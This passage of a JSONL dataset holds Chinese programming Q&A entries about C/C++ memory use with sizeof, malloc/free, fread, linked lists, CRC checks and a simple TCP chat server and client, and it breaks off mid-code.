(List)malloc(sizeof(Node));\n        if (!cur) {\n            printf(\"申请内存失败！\");\n            exit(0);\n        }\n        cur = list->next;\n        while (cur != NULL) {\n            printf(\"链表第%d个节点为：%d\\n\", i, cur->elem);\n            num[i - 1] = cur->elem;\n            i++;\n            cur = cur->next;\n        }\n    }\n    return num;\n}\n\nint main() {\n    List list = init();\n    add(list, 3);\n    add(list, 2);\n    add(list, 1);\n    append(list, 4);\n    printf(\"链表是否为空：%d\\n\", isEmpty(list));\n    printf(\"链表长度为:%d\\n\", length(list));\n    travel(list);\n    return 0;\n}\n", "\n\n"]], "Tag": "程序设计"}
{"Answer": "和dx应该没有关系。但是你应该以调试方式启动程序，而不是直接运行，找到出错的行和调用堆栈，才好分析。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["VS2013 使用openssl库后 程序无法正常启动0xc000007b", ["我的程序需要计算md5值，因此想使用openssl库来获取md5，好不容易装上了openssl，然后程序也编译完成了，结果运行exe时弹框 应用程序无法正常启动0xc000007b 。我的openssl编译的时候配置的是 perl Configure VC-WIN32 这应该是编译的32位吧，那我程序配置也是编译32位的，编译过了，为啥会出现这种无法启动的情况呢？", "\n如果注释掉MD5_Init MD5_Update MD5_Final 程序就能运行，代码如下", "\n        MD5_CTX c;", "\n        unsigned char md5[17] = { 0 };", "\n        MD5_Init(&c);", "\n        while (1)", "\n        {", "\n            memset(tmpBuf, 0, sizeof(tmpBuf));", "\n            readLen = apkFile.Read(tmpBuf, sizeof(tmpBuf));", "\n            if (readLen>0)", "\n            {", "\n                file.Write(tmpBuf, readLen);", "\n                totalReadCnt += readLen;", "\n                //MD5_Update(&c, tmpBuf, readLen);", "\n                if (readLen < sizeof(tmpBuf))", "\n                    break;//读取到文件尾", "\n            }", "\n            else if (readLen == 0)//读取到文件尾", "\n            {", "\n                break;", "\n            }", "\n            else", "\n            {", "\n                err.Format(\"文件读写出错！ readLen=%d,totalReadCnt=%d,tmpBuf=%s\", readLen, totalReadCnt, tmpBuf);", "\n                MessageBox(err);", "\n                return -1;", "\n            }", "\n        }", "\n        //MD5_Final(md5, &c);", "\n我的电脑已经安装了DirectX11，难道跟DirectX有关系吗"]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;&lt;code class=\"language-c\"&gt;\nchar* convert_2(int dec)\n{\n    &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;这里就是申请一个大小为&lt;span class=\"hljs-number\"&gt;33&lt;/span&gt;的动态字符数组\n    char* the_String &amp;#61; (char*) malloc(sizeof (int) * Bits_in_Byte &amp;#43; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;);&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;sizeof(int)&amp;#61;&lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;,the_String&amp;#61;&lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;*&lt;span class=\"hljs-number\"&gt;8&lt;/span&gt;&amp;#43;&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;&amp;#61;&lt;span class=\"hljs-number\"&gt;33&lt;/span&gt;\n    int i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    int bitMask &amp;#61; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;;\n    int tempbitMask &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n\n    &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;这里就是这个函数的主体算法&amp;#xff0c;循环次数为&lt;span class=\"hljs-number\"&gt;32&lt;/span&gt;次&amp;#xff0c;因为条件为大于等&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;&amp;#xff0c;所以&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;的那一次也会运行,其实就是每次循环取一个位\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt;(i &amp;#61; sizeof (int) * Bits_in_Byte -&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;; i&amp;gt;&amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i--) {&lt;!-- --&gt;&lt;span class=\"hljs-regexp\"&gt;//i&lt;/span&gt;&amp;#61;&lt;span class=\"hljs-number\"&gt;31&lt;/span&gt;\n\n        &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;你这个转换的公式是没问题的&amp;#xff0c;但是这里主要不是看它的十进制值&amp;#xff0c;而是二进制值&amp;#xff0c;\n        &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;你代入一下会发现第一次的值为 &lt;span class=\"hljs-number\"&gt;1000&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0000&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0000&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0000&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0000&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0000&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0000&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0000&lt;/span&gt;(最右为&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;位&amp;#xff0c;最左为&lt;span class=\"hljs-number\"&gt;31&lt;/span&gt;位)\n        &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;第二次的值为                &lt;span class=\"hljs-number\"&gt;0100&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0000&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0000&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0000&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0000&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0000&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0000&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0000&lt;/span&gt;\n        &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;第三次的值为                &lt;span class=\"hljs-number\"&gt;0010&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0000&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0000&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0000&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0000&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0000&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0000&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0000&lt;/span&gt;\n        &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;这个值其实是为了能够与一个值相与以取这个值某个位&amp;#xff0c;具体是哪一个位就看tempbitMask里面&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;的位置\n        &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;以第一次为例&amp;#xff0c;就是取&lt;span class=\"hljs-number\"&gt;31&lt;/span&gt;位的值&amp;#xff0c;第二次就是&lt;span class=\"hljs-number\"&gt;30&lt;/span&gt;位&amp;#xff0c;一直到&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;位\n        tempbitMask &amp;#61; bitMask &amp;lt;&amp;lt; i;&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;tempbitMask &amp;#61; bitMask*&lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;^i\n\n        &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;emmm&amp;#xff0c;这是&lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;判断&amp;#xff0c;然后tempbitMask &amp;amp; dec这个运算就是取dec第i位的数据&amp;#xff0c;\n        &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;因为是二进制&amp;#xff0c;值只有&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;/&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;所以就用&lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;判断写&lt;span class=\"hljs-string\"&gt;&amp;#39;0&amp;#39;&lt;/span&gt;、&lt;span class=\"hljs-string\"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;两种字符了\n        &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;想要理解这种以位相与取位的原理&amp;#xff0c;最好还是取几次循环的的情况代入值自己用计算器算一下&amp;#xff0c;很容易就能明白\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt;(tempbitMask &amp;amp; dec)&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;这个循环没看懂\n \n            the_String[&lt;span class=\"hljs-number\"&gt;31&lt;/span&gt; - i]  &amp;#61; &lt;span class=\"hljs-string\"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;;&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;进入此分支代表dec的第i位为&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;所以就写入&lt;span class=\"hljs-string\"&gt;&amp;#39;1&amp;#39;&lt;/span&gt;\n \n        &lt;span class=\"hljs-keyword\"&gt;else&lt;/span&gt; {\n            the_String[&lt;span class=\"hljs-number\"&gt;31&lt;/span&gt; - i] &amp;#61; &lt;span class=\"hljs-string\"&gt;&amp;#39;0&amp;#39;&lt;/span&gt;;&lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;同上\n\n        }\n \n    }\n \n    &lt;span class=\"hljs-regexp\"&gt;//&lt;/span&gt;这里就是为什么&lt;span class=\"hljs-number\"&gt;32&lt;/span&gt;个位却申请了&lt;span class=\"hljs-number\"&gt;33&lt;/span&gt;个字符的原因&amp;#xff0c;字符串需要一个字符在字符串的最后存放字符串结束符(即&lt;span class=\"hljs-string\"&gt;&amp;#39;\\0&amp;#39;&lt;/span&gt;&amp;#xff0c;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;也可以)\n    the_String[&lt;span class=\"hljs-number\"&gt;32&lt;/span&gt;] &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    return the_String;\n}\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["这个方法是求二进制的，但是有一些代码没有看明白， ps：如果我的注释有问题，请指出", ["char* convert_2(int dec)", "{", "    char* the_String = (char*) malloc(sizeof (int) * Bits_in_Byte + 1);", "//sizeof(int)=4,the_String=4*8+1=33", "    int i = 0;", "    int bitMask = 1;", "    int tempbitMask = 0;", "    for(i = sizeof (int) * Bits_in_Byte -1; i>= 0; i--) {", "//i=31", "\n", "    tempbitMask =  bitMask<<i;_**", "//", "tempbitMask = bitMask*", "2", "^i**_\n\n    ", "if", "(tempbitMask & dec)", "//", "这个循环没看懂\n\n        the_String[", "31", "-i]  = ", "'1'", ";\n\n    ", "else", " {\n        the_String[", "31", "-i] = ", "'0'", ";\n\n    }\n\n}\n\nthe_String[", "32", "] = ", "0", ";\nreturn the_String;\n", "\n", "}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;入队函数中传给crc32_itu第二个参数是head.fileSize&lt;br /&gt;出队函数中传给crc32_itu第二个参数是head.packSize-sizeof (package_head)&lt;br /&gt;你确定这两个数值是一样的吗&amp;#xff1f;&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["QList在两个函数中第一个元素值不一样", ["本人使用一个QList模拟队列存储字符数组，每个字符数组的大小大概在4000-14000，代码如下：", " QList<char *> Package_Queue;", "下列入队和出队函数中，testchar是我申明的全局变量，一个字符指针，用于测试两个函数中获取到的第一个元素是否相同。", "入队函数：", "\n", "    ", "while", "(!queuelock->", "try", "Lock()", "){}\n    package_head head; ", "//数据包头", "\n    memset(&head,", "0", ",sizeof (package_head));\nmemcpy(&head,package,sizeof (package_head));\n", "Package_Queue", ".", "push", "_back(", "package", ")", ";\ntestchar=*(", "Package_Queue", ".", "begin", "()", ");\n q", "Debug()", "<<", "\"enenqueue crc check\"", "<<head.CRCCode<<crc32", "_itu(", "testchar", "+", "sizeof", " (", "package_head", ")", ",head.fileSize)<<endl;  ", "//对比生成的CRC校验", "\nq", "Debug()", "<<", "\"compare  enqueue char[]\"", "<<strcmp((*", "Package_Queue", ".", "begin", "()", " ),(package))<<endl; ", "//对比出队的数据是否相等", "\nemit package", "Queue_new()", ";\nqueuelock->unlock", "()", ";\n};\n", "\n", "出队函数：", "\n", "char", "* ", "QueueManage", "::popqueue_Package_Queue(){\n    while(!queuelock->tryLock()){}\n    ", "if", "(", "Package_Queue", ".isEmpty())\n        return nullptr;\n    package_head head;\n    memset(&head,", "0", ",sizeof (package_head));\n    char *", "data", ";", "\n    ", "data", "=", "Package_Queue", ".takeFirst();", "\n     memcpy(&head,", "data", ",sizeof (", "package_head", "));", "\n    qDebug()<<", "\"pop queue crc check\"", "<<head.", "CRCCode", "<<crc32_itu(", "data", "+sizeof (", "package_head", "),head.packSize-sizeof (", "package_head", "))<<head.fileSize<<endl;;", "\n    qDebug()<<", "\"compare  pop char[]\"", "<<strcmp(testchar,", "data", ")<<endl;", "\n    emit ", "PackageQueue_pop", "();\n    queuelock->unlock();\n    return ", "data", ";", "\n};\n", "\n", "CRC32校验的代码如下：", "\n", "uint32_t QueueManage::crc32_itu(", "char", " *data, int length){\n    uint8_t i;\n     uint32_t ", "crc", " = 0xffffffff;  ", "// Initial value", "\n     ", "while", "(length--)\n       {\n        ", "crc", " ^= *data; data++;\n        ", "for", " (i = 0; i < 8; ++i)\n        {\n        ", "if", " (", "crc", " & 1)\n          ", "crc", " = (", "crc", " >> 1) ^ 0xEDB88320;", "// 0xEDB88320= reverse 0x04C11DB7", "\n         ", "else", "\n        ", "crc", " = (", "crc", " >> 1);\n          }}\n     ", "return", " ~", "crc", ";\n};\n\n", "\n", "然后运行中出现了如下输出：", "enenqueue crc check 698326302 698326302       //入队时，两个crc校验码相同", "compare  enqueue char[] 0", "pop queue crc check 698326302 865988787    //出队函数中，还是原来的char指针，生成的crc校验却不同", "compare  pop char[] 0", "但是比较第一个元素和出队的元素，又是相同的，想请教下是什么情况，怎么解决"]], "Tag": "程序设计"}
{"Answer": "举个例子来说，如果有个人经常问你借一样东西：\r\n    对这个东西的处理方法有两种：\r\n\t\t    （1）他不停地借、还，耗时，效率低。\r\n\t\t\t\t（2）让他借一次，等他的确不用的时候再还，但是在他没还之前，别人就不能用了。\r\nmalloc就是借内存，free就像是还内存\r\n    操作系统为了提高效率，就采用了第（2）处理办法，反正操作系统可以搞到很多内存。\r\n\t\tfree可以理解为“假还”，东西还在你那里，但是你不应该继续使用了，应该去借。\r\n\t\t    对于部分操作系统，free之后是把intPointer[0].....的值给删除了、部分不是。\r\n另外提一句：\r\n    free之后要，intPointer = NULL;\r\n理解万岁！！！", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言中malloc和free的问题", ["int *intPointer = (int *)malloc(3 * sizeof(int));\n\nintPointer[0] = 1;\nintPointer[1] = 2;\nintPointer[2] = 3;\n\nprintf(\"before free :%ld\\n\",intPointer);\n\nfree(intPointer);\n\nprintf(\"after  free :%ld\\n\",intPointer);\nprintf(\"%d\\t%d\\t%d\\n\",intPointer[0],intPointer[1],intPointer[2]);\n", "\n\n", "输出结果：", "\nbefore free :4296037472", "\nafter  free :4296037472", "\n1   2   3", "\n\n", "疑问：free(intPointer)之后，为什么还能通过intPointer访问malloc分配的那片内存？"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;这要仔细看看&amp;#xff0c;调试一下&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt; struct &lt;span class=\"hljs-keyword\"&gt;node&lt;/span&gt;&lt;span class=\"hljs-title\"&gt;* temp&lt;/span&gt;&amp;#61;(struct &lt;span class=\"hljs-keyword\"&gt;node&lt;/span&gt;&lt;span class=\"hljs-title\"&gt;*)malloc&lt;/span&gt;(sizeof(struct &lt;span class=\"hljs-keyword\"&gt;node&lt;/span&gt;&lt;span class=\"hljs-title\"&gt;*));\n改为\n struct&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;node&lt;/span&gt;&lt;span class=\"hljs-title\"&gt;* temp&lt;/span&gt;&amp;#61;(struct &lt;span class=\"hljs-keyword\"&gt;node&lt;/span&gt;&lt;span class=\"hljs-title\"&gt;*)malloc&lt;/span&gt;(sizeof(struct &lt;span class=\"hljs-keyword\"&gt;node&lt;/span&gt;&lt;span class=\"hljs-title\"&gt;));\n\n&lt;/span&gt;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;后面所有的malloc都是错的&amp;#xff0c;sizeof后面不能是指针类型的&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于#链表#的问题，如何解决？", ["新学链表", "题目：已知有两个递增的正整数序列A和B，序列中元素个数未知，同一序列中不会有重复元素出现，有可能某个序列为空。现在将AB所有的元素归并到一个链表，A和B相同的元素放到另一个链表里。", "\n", "typedef struct node\n{\n    int number;\n    struct node* nextPtr;\n}Node;\nint input(Node* head)\n{\n    int n,", "cnt", "=0;\n    scanf(", "\"%d\"", ",&n);\n    struct node* ", "buf", "=head;\n    ", "while", " (n!=-1)\n    {\n        struct node* temp=(struct node*)malloc(sizeof(struct node*));\n        temp->", "number", "=n;\n        temp->", "nextPtr", "=", "NULL", ";\n        buf->", "nextPtr", "=temp;\n        ", "buf", "=buf->nextPtr;\n        scanf(", "\"%d\"", ",&n);\n        cnt+=1;\n    }\n    return cnt;\n}\n\nvoid output(Node* head)\n{\n    Node* ", "tempa", "=head->nextPtr;\n    ", "while", " (tempa!=", "NULL", ")\n    {\n        printf(", "\"%d\"", ",tempa->number);\n        ", "tempa", "=tempa->nextPtr;\n        \n    }\n}\n\nint main()\n{\n    Node* headA=(Node*)malloc(sizeof(Node*));\n    Node* headB=(Node*)malloc(sizeof(Node*));\n    int ", "nA", "=input(headA),nB=input(headB);\n    Node* ", "temp1", "=headA->nextPtr,*temp2=headB->nextPtr;\n    Node* ans1=(Node*)malloc(sizeof(Node*)),", "*a", "ns2=(Node*)malloc(sizeof(Node*));\n    Node* ", "tick1", "=ans1,*tick2=ans2;\n    ", "while", " (temp1!=", "NULL", "&&temp2!=", "NULL", ")\n    {\n        ", "if", " (temp1->", "number", "==temp2->number)\n        {\n            Node ", "*b", "uf=(Node*)malloc(sizeof(Node*));\n            buf->", "number", "=temp2->number;\n            buf->", "nextPtr", "=", "NULL", ";\n            tick2->", "nextPtr", "=buf;\n            ", "tick2", "=tick2->nextPtr;\n            ", "temp1", "=temp1->nextPtr;\n            ", "temp2", "=temp2->nextPtr;\n            \n        }\n        ", "else", " ", "if", " (temp1->number>temp2->number)\n        {\n            Node ", "*b", "uf=(Node*)malloc(sizeof(Node*));\n            buf->", "number", "=temp2->number;\n            buf->", "nextPtr", "=", "NULL", ";\n            tick1->", "nextPtr", "=buf;\n            ", "tick1", "=tick1->nextPtr;\n            ", "temp2", "=temp2->nextPtr;\n            \n        }\n        ", "else", "\n        {\n            Node ", "*b", "uf=(Node*)malloc(sizeof(Node*));\n            buf->", "number", "=temp1->number;\n            buf->", "nextPtr", "=", "NULL", ";\n            tick1->", "nextPtr", "=buf;\n            ", "tick1", "=tick1->nextPtr;\n            \n            ", "temp1", "=temp1->nextPtr;\n        }\n        ", "if", " (", "temp1", "==NULL)\n        {\n            \n            ", "while", " (temp2!=", "NULL", ")\n            {\n                Node ", "*b", "uf=(Node*)malloc(sizeof(Node*));\n                buf->", "number", "=temp2->number;\n                buf->", "nextPtr", "=", "NULL", ";\n                tick1->", "nextPtr", "=buf;\n                ", "tick1", "=tick1->nextPtr;\n                ", "temp2", "=temp2->nextPtr;\n                \n            }\n        }\n        ", "if", " (", "temp2", "==NULL)\n        {\n            ", "while", " (temp1!=", "NULL", ")\n            {\n                Node ", "*b", "uf=(Node*)malloc(sizeof(Node*));\n                buf->", "number", "=temp1->number;\n                buf->", "nextPtr", "=", "NULL", ";\n                tick1->", "nextPtr", "=buf;\n                ", "tick1", "=tick1->nextPtr;\n                ", "temp1", "=temp1->nextPtr;\n            }\n        }\n    }\n    output(ans1);\n    output(ans2);\n}\n\n", "\n", "现在问题是运行不出答案，代码比较复杂所以自己没有找到原因，希望能帮忙解答一下", "用例：1 3 4 5 6 7 -1", "2 3 6 8 9 10 11-1", "\n", "输出：1 2 3 4 5 6 7 8 9 10 11", "3 6"]], "Tag": "程序设计"}
{"Answer": "![图片说明](https://img-ask.csdn.net/upload/201601/27/1453897551_348963.png)", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么一定要用写字板的方式打开？", ["通过下面这些，我发现：如果要把信息保存在txt文件中，就必须以写字板的方式打开这", "\n个txt文件，再来写入信息，这样的话就可以正确地读出这个txt文件里的内容。如果以记", "\n事本的方式打开这个txt文件就不可以正确地读出这个txt文件里的内容。不知道我的这个", "\n想法对不对？还有就是同样的一个txt文件，用记事本的方式和用写字板的方式打开，里", "\n面的内容怎么会不一样？", "\n\n", " #include<stdio.h>\n#include<stdlib.h>\nstruct st\n{\n    char name[4];\n    char age[3];\n    char tel[9];\n}s[3];\nvoid main()\n{\n    int i,n;\n    FILE *fpe; FILE *fpo;\n    for(i=0;i<3;i++)\n    {\n        scanf_s(\"%s\",s[i].name,4);getchar();\n        scanf_s(\"%s\",s[i].age,3);getchar();\n        scanf_s(\"%s\",s[i].tel,9);getchar();\n    }\n    fopen_s(&fpo,\"e:\\\\students.txt\",\"w\");\n    if(fpo==NULL)\n    {\n        printf(\"打不开\\n\");\n        exit(0);\n    }\n    for(i=0;i<3;i++)\n    {\n        n=fwrite(&s[i],sizeof(struct st),1,fpo);\n        if(n!=1)\n            printf(\"file write error\");\n    }\n    fclose(fpo);\n    fopen_s(&fpe,\"e:\\\\students.txt\",\"r\");\n    if(fpe==NULL)\n    {\n        printf(\"打不开\\n\");\n        exit(0);\n    }\n    for(i=0;i<3;i++)\n    {\n        n=fread(&s[i],sizeof(struct st),1,fpe);\n        if(n!=1)\n            printf(\"file read error\");\n        printf(\"%-4s%3s%9s\\n\",s[i].name,s[i].age,s[i].tel);\n    }\n    fclose(fpe);\n    system(\"pause\");\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;&lt;code class=\"language-c&amp;#43;&amp;#43;\"&gt;for (int i &lt;span class=\"hljs-operator\"&gt;&amp;#61;&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;&lt;span class=\"hljs-comment\"&gt;; i &amp;lt; 19844; &amp;#43;&amp;#43;i)&lt;/span&gt;\n{\nkk1[i] &lt;span class=\"hljs-operator\"&gt;&amp;#61;&lt;/span&gt; (double*)malloc(sizeof(double) * &lt;span class=\"hljs-number\"&gt;19844&lt;/span&gt;)&lt;span class=\"hljs-comment\"&gt;;&lt;/span&gt;\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;二维数组空间不是分配好了&amp;#xff0c;你这循环分配&amp;#xff0c;怎么可能够用啊&lt;br /&gt;你要想都赋值为0&amp;#xff0c;可以用memset啊&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言用malloc申请19844*19844二维数组，写入位置冲突", [" double** kk1;", "    kk1 = (double**)malloc(sizeof(double*) * 19844);", "    for (int i = 0; i < 19844; ++i)", "    {", "        kk1[i] = (double*)malloc(sizeof(double) * 19844);", "    }", "    if (kk1 == NULL)", "    {", "        printf(\"error\");", "    }", "    for (int i = 0; i < 19844; i++)", "    {", "        for (int j = 0; j < 19844; j++)", "        {", "            kk1[i][j] = 0;", "        }", "    }", "    printf(\"%lf\", kk1[0][0]);", "}", "请指教！！感谢"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;最后一位要留出来的&amp;#xff0c;必须以终止符’\\0&amp;#39;作为边界。&lt;br /&gt;比如字符素组长度是也是不计算&amp;#39;\\0&amp;#39;&amp;#xff1b;&lt;br /&gt;char chs[7] &amp;#61; {&amp;#39;a&amp;#39;, &amp;#39;c&amp;#39;, &amp;#39;0&amp;#39;, &amp;#39;z&amp;#39;, &amp;#39;3&amp;#39;,&amp;#39;d&amp;#39;}; -----长度为6&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言文件操作fread 问题", ["现在 t.txt  中 只有 012 这三个 字符", "\n", "    FILE* pf = fopen(", "\"t.txt\"", ",", "\"r\"", ");\n    ", "char", " s[", "3", "];\n    fread(s,", "sizeof", "(", "char", "),", "3", ",pf);\n    cout<<s;\n", "\n", "↑如果这样写 就输出 12 不输出 0 ， 我的 012 呢 ？ 就算 s 末尾 给补 '\\0' ，也应该是 01 啊", "\n", "    FILE* pf = fopen(", "\"t.txt\"", ",", "\"r\"", ");\n    ", "char", " s[", "3", "];\n    fread(s,", "sizeof", "(", "char", "),", "2", ",pf);\n    cout<<s;\n\n", "\n", "↑如果这样写 就输出 01， 这个能理解", "\n", "\n    FILE* pf = fopen(", "\"t.txt\"", ",", "\"r\"", ");\n    ", "char", " s[", "4", "];\n    fread(s,", "sizeof", "(", "char", "),", "3", ",pf);\n    cout<<s;\n", "\n", "↑数组开大点 就能 读出 012 了"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;这是fread函数&amp;#xff0c;他表示从文件fp中获取一个数据大小为sizeof(user&amp;#xff09;的字符放进第一个数组中&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["请问这句代码表达的是什么意思", ["while(fread(&total_user[total],sizeof(user),1,fp)!=(int)NULL)"]], "Tag": "程序设计"}
{"Answer": "I assume you can make sense of my code!\r\nso i just show you code below,if you have any question,\r\njust let me know !!1\r\n\r\nserver.c\r\n\r\n```\r\n#include &lt;stdio.h&gt;\r\n#include &lt;string.h&gt;\r\n#include &lt;stdlib.h&gt;\r\n#include &lt;errno.h&gt;\r\n#include &lt;sys/types.h&gt;\r\n#include &lt;sys/socket.h&gt;\r\n#include &lt;netinet/in.h&gt;\r\n#include &lt;unistd.h&gt;\r\n\r\n#define BUF_SIZE 1024\r\n#define LISTEN_PORT 8889\r\n#define LISTEN_NO 10\r\n#define err_exit(msg) (perror(msg),(exit(EXIT_FAILURE)))\r\n\r\nint sock_make(void);\r\nvoid read_from(int fd);\r\nvoid send_to(int fd);\r\n\r\nint main(void)\r\n{\r\n    int sockfd,connfd;\r\n    struct sockaddr_in clientaddr;\r\n    int n;\r\n    char buf[BUF_SIZE];\r\n    char recvbuf[BUF_SIZE];\r\n    char sendbuf[BUF_SIZE];\r\n\r\n\r\n    sockfd=sock_make();\r\n    while(1){\r\n        //If you wanna know which client and what the ip is \r\n        //You should no set the the argu being NULL ..\r\n\r\n        if((connfd=accept(sockfd,(struct sockaddr*)NULL,NULL))&lt;0)\r\n        {\r\n            err_exit(\"&gt;&gt;accept\");\r\n        }else{\r\n            while(1){\r\n                puts(\"-----------wait message---------\");\r\nKEEP_READ:\r\n                n=read(connfd,recvbuf,sizeof(recvbuf));\r\n                //recvbuf[n]=0;\r\n                printf(\"%s\\n\",recvbuf);\r\n                if(strncmp(recvbuf,\".\",1)) goto KEEP_READ;\r\n                puts(\"-----------Please input----------\");\r\nKEEP_SEND:\r\n                n=read(STDIN_FILENO,sendbuf,sizeof(sendbuf));\r\n                sendbuf[n]=0;\r\n                write(connfd,sendbuf,sizeof(sendbuf));\r\n                if(strncmp(sendbuf,\".\",1)) goto KEEP_SEND;\r\n\r\n            }\r\n            close(connfd);\r\n        }\r\n    }\r\n    close(sockfd);\r\n    return 0;\r\n}\r\nint sock_make(void)\r\n{\r\n    struct sockaddr_in clientaddr;\r\n    int sockfd;\r\n    memset(&amp;clientaddr,SOCK_STREAM,sizeof(clientaddr));\r\n    clientaddr.sin_family=AF_INET;\r\n    clientaddr.sin_port=htons(LISTEN_PORT);\r\n    clientaddr.sin_addr.s_addr=htonl(INADDR_ANY);\r\n\r\n    if((sockfd=socket(AF_INET,SOCK_STREAM,0))&lt;0)\r\n    {\r\n        err_exit(\"&gt;&gt;socket\");\r\n    }\r\n\r\n    if(bind(sockfd,(struct sockaddr*)&amp;clientaddr,sizeof(clientaddr))&lt;0)\r\n    {\r\n        err_exit(\"&gt;&gt;bind\");\r\n    }\r\n\r\n    listen(sockfd,LISTEN_NO);\r\n\r\n    return sockfd;\r\n}\r\n\r\n \r\n```\r\n\r\nclient.c\r\n\r\n\r\n\r\n```\r\n #include &lt;stdio.h&gt;\r\n#include &lt;string.h&gt;\r\n#include &lt;stdlib.h&gt;\r\n#include &lt;errno.h&gt;\r\n#include &lt;sys/types.h&gt;\r\n#include &lt;sys/socket.h&gt;\r\n#include &lt;netinet/in.h&gt;\r\n#include &lt;unistd.h&gt;\r\n\r\n\r\n#define BUF_SIZE 1024\r\n#define LISTEN_PORT 8889\r\n#define LISTEN_NO 10\r\n#define err_exit(msg) (perror(msg),(exit(EXIT_FAILURE)))\r\n\r\nint main(int argc,char * argv[])\r\n{\r\n    int sockfd;\r\n    int n;\r\n    struct sockaddr_in serverAddr;\r\n    char sendbuf[BUF_SIZE];\r\n    char recvbuf[BUF_SIZE];\r\n\r\n    if((sockfd=socket(PF_INET,SOCK_STREAM,0))&lt;0)\r\n    {   \r\n        err_exit(\"&gt;&gt;socket\");\r\n    }   \r\n    memset(&amp;serverAddr,0,sizeof(serverAddr));\r\n\r\n    serverAddr.sin_family=AF_INET;\r\n\r\n    serverAddr.sin_port=htons(LISTEN_PORT);\r\n    inet_pton(PF_INET,argv[1],&amp;serverAddr.sin_addr.s_addr);\r\n\r\n    while(1)\r\n    {   \r\n        if((connect(sockfd,(struct sockaddr*)&amp;serverAddr,sizeof(serverAddr)))&lt;0)\r\n        {\r\n            err_exit(\"&gt;&gt;connect\");\r\n        }else{\r\n            while(1){\r\n\r\n                puts(\"--------------Please input-----------\");\r\nKEEP_SEND:\r\n                n=read(STDIN_FILENO,sendbuf,sizeof(sendbuf));\r\n                